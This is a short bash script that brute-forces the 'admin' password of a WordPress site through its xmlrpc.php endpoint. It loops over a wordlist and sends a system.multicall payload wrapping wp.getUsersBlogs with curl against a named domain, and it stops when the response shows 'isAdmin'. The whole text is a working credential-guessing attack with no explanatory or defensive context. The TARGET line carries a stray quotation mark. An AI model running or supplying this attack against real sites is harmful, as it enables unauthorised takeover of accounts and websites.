#!/bin/bash

TARGET="https://hazercloud.com/xmlrpc.php""
USERNAME="admin"
WORDLIST="/root/passwords.txt"

while read PASSWORD; do
  echo "Trying password: $PASSWORD"
  PAYLOAD="<methodCall>
            <methodName>system.multicall</methodName>
            <params>
              <param>
                <value>
                  <array>
                    <data>
                      <value>
                        <struct>
                          <member>
                            <name>methodName</name>
                            <value>wp.getUsersBlogs</value>
                          </member>
                          <member>
                            <name>params</name>
                            <value>
                              <array>
                                <data>
                                  <value>$USERNAME</value>
                                  <value>$PASSWORD</value>
                                </data>
                              </array>
                            </value>
                          </member>
                        </struct>
                      </value>
                    </data>
                  </array>
                </value>
              </param>
            </params>
          </methodCall>"
  RESPONSE=$(curl -s -d "$PAYLOAD" -H "Content-Type: text/xml" $TARGET)
  if echo "$RESPONSE" | grep -q "isAdmin"; then
    echo "Success! Password: $PASSWORD"
    break
  fi
done < $WORDLIST
